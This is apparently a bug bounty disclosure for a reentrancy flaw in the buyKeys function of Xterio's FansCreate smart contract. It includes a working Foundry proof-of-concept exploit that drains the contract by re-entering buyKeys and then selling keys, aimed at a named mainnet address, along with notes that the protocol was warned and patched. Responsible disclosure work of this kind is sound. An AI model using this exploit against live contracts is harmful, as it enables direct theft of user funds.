# Reentrancy attack on `buyKeys` function

- Protocol: [Xterio](https://www.xter.io/)
- Severity: Critical

## Target(s)

- [FansCreate](https://bnb.xterscan.io/address/0x70D75ae4b40Ac5A8E1f2AbE888978Ba28329C00F)

## Impact(s)

- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Bug Description

### Brief/Intro

The `buyKeys` function has no `nonReentrant` guard so it is susceptible to reentrancy attacks, with the combination of the `sellKeys` function all the funds of the contract can be stolen.

### Vulnerability Details

In the `buyKeys` function the purchase price is calculated, then the surplus is returned to the sender and finally the ERC1155 is undermined. If the sender is a contract, it could take advantage of the call where the surplus is returned and make another purchase without updating the `totalSupply`, thus miscalculating the purchase price. Then this contract sells the tokens bought at a lower price for a higher price, emptying the total funds of the contract.

### Impact Details

The total balance of the **FansCreate** contract

## Proof of Concept

```solidity
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract PoC is Test {
    function testPoC() public {
        vm.selectFork(vm.createFork("https://xterio-bnb.alt.technology"));

        IFansCreate fans = IFansCreate(0x70D75ae4b40Ac5A8E1f2AbE888978Ba28329C00F);

        HackBuyer hackBuyer = new HackBuyer();
        vm.deal(address(hackBuyer), 1000 ether);

        // Start the attack
        for (uint i; i < 200;i++) {
            if (address(fans).balance < 50 ether) break;
            hackBuyer.buyKeys(fans, 1);
        }

        if (address(hackBuyer).balance > 1000 ether){
            console.log("Win");
            uint total = address(hackBuyer).balance - 1000 ether;
            console.log(total);
            console.log(total / 1e18);
        } else
            console.log("LOSS");
    }


    receive() external payable {}
}

contract HackBuyer is ERC1155Holder {
    IFansCreate fans;
    uint256 workId;
    uint256 amount = 500;

    function buyKeys(IFansCreate _fans, uint256 _workId) public {
        fans = _fans;
        workId = _workId;
        fans.buyKeys{value: fans.getBuyPrice(workId, 1).priceAfterFee + 1}(
            address(this), // trader,
            workId, // workId,
            1, // amount,
            99999999999999999 // maxPriceAfterFee
        );

        fans.sellKeys(
            workId,
            fans.balanceOf(address(this), workId),
            0
        );

        i = 0;
    }

    uint256 i;

    receive () payable external {
        if (i++ > 1) return;
        fans.buyKeys{value: fans.getBuyPrice(workId, amount).priceAfterFee + 1}(
            address(this), // trader,
            workId, // workId,
            amount, // amount,
            999999999999999999999999999999999999999999 // maxPriceAfterFee
        );
    }
}


interface IFansCreate {
    struct PriceFeeInfo {
        uint256 price;
        uint256 priceAfterFee;
        uint256 creatorFee;
        uint256 projectFee;
        uint256 protocolFee;
        uint256 projectId;
    }

    function balanceOf(address account, uint256 id) external view returns (uint256);

    function getBuyPrice(
        uint256 workId,
        uint256 amount
    ) external view returns (PriceFeeInfo memory);

    function buyKeys(
        address trader,
        uint256 workId,
        uint256 amount,
        uint256 maxPriceAfterFee
    ) external payable;

    function sellKeys(
        uint256 workId,
        uint256 amount,
        uint256 minPriceAfterFee
    ) external;
}
```

## Info after reported

- rotcivegaf: 

At the time I submitted the report, the bug was active and the funds(874 BNB â‰ˆ 500k USD) were at risk. Through this report and through their discord I warned the protocol, after a few hours they managed to protect themselves from the attack. I believe I have managed to safeguard these funds

- Declan (Xterio): 

This issue has already been reported by another WHITEHAT in report #####.

The bug bounty program only pays a reward to the first report of any particular issue, so this report will not receive a reward.
